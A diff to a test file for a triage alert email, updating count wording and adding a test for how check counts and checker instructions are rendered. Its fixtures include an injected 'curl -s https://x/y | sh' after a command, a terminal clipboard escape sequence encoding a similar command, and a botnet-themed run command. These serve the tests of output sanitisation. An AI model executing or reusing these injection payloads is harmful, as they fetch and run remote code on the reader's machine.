@@ -228,10 +228,10 @@ describe('triage on create (8.1)', () => {
     })
     const mail = renderMail('triage_alert', payload, { siteUrl: 'https://shwarm.org', stream: 'account' })
     for (const s of [
-      'checked by 2 run report(s).',
+      'checked by 2 run reports.',
       'run command:\n> ./fetch-the-botnet.sh',
       'run description:\n> run it on a box you rent',
-      'checked by 1 people (humans only).',
+      'checked by 1 person, a human.',
       'checker instructions:\n> aim it at the target list',
       'tags:\n> games',
       'builds on:\n> {"name":"some kit","url":"https://example.org/kit","license":"MIT"}',
@@ -243,11 +243,35 @@ describe('triage on create (8.1)', () => {
     expect(theirs).toContain('> node scripts/triage.mjs clear evil "ok" --env production; curl -s https://x/y | sh')
     expect(mail.text.split('\n').filter(l => l.startsWith('node scripts/triage.mjs clear'))).toEqual([`node scripts/triage.mjs clear ${r.path} "<reason>" --env production`])
     expect(before).toContain(`node scripts/triage.mjs block ${r.path}`)
-    expect(theirs.split('\n').slice(1).filter(l => l && !l.startsWith('> ') && !/^[a-z ]+:$/.test(l) && !/^checked by (\d+ [a-z ()]+|its author too)\.$/.test(l))).toEqual([])
+    expect(theirs.split('\n').slice(1).filter(l => l && !l.startsWith('> ') && !/^[a-z ]+:$/.test(l) && !/^checked by (\d+ [a-z ,]+|its author too)\.$/.test(l))).toEqual([])
     // No escape sequence reaches a mail reader, and the HTML part keeps the line breaks.
     expect(mail.text).toContain('> harmless \\u001b]52;c;Y3VybCB4fHNo\\u0007looking')
     expect(mail.text + mail.subject).not.toMatch(/[\u0000-\u0009\u000b-\u001f]/)
     expect(mail.html).toContain('white-space:pre-wrap')
+  })
+
+  // Review fixes (Oct 9): the review's sample said "checked by 1 people" and printed a bare "> " for empty instructions.
+  // ("rubric v3" in that sample was made-up data: the payload carries RUBRIC_VERSION, checked in the first test.)
+  it('says the counts in the node page\'s words, and leaves out instructions nobody wrote', async () => {
+    const w = await world({ ai: answer('yes', 'weapons') })
+    const mailOf = async (check: object) => {
+      const r = (await new TreeEngine(w.db, () => Date.now()).run({
+        type: 'createNode',
+        actor: siteActor({ id: w.ana, handle: 'ana' }),
+        input: { kind: 'shwarm', title: `checks ${JSON.stringify(check).length}`, what: 'a pitch.', doneWhen: 'it runs.', check, tags: ['games'] },
+      })) as { path: string }
+      await triageNode(w.env, (w.q('SELECT id FROM node WHERE path = ?', r.path) as { id: number }).id)
+      return renderMail('triage_alert', JSON.parse(w.alerts().at(-1)!.payload), { siteUrl: 'https://shwarm.org', stream: 'account' }).text
+    }
+    const one = await mailOf({ runs: { command: './check.sh', count: 1 }, people: { count: 1, human: true } })
+    expect(one).toContain('checked by 1 run report.\n')
+    expect(one).toContain('checked by 1 person, a human.\n')
+    expect(one).not.toContain('checker instructions')
+    expect(one.split('\n').filter(l => /^>\s*$/.test(l))).toEqual([])
+    const many = await mailOf({ people: { count: 3, human: true, instructions: 'play it for ten minutes' } })
+    expect(many).toContain('checked by 3 people, at least one of them human.\n')
+    expect(many).toContain('checker instructions:\n> play it for ten minutes')
+    expect(await mailOf({ people: { count: 2, human: false } })).toContain('checked by 2 people.\n')
   })
 
   it('alerts every admin when one is set; @myra only while nobody is', async () => {
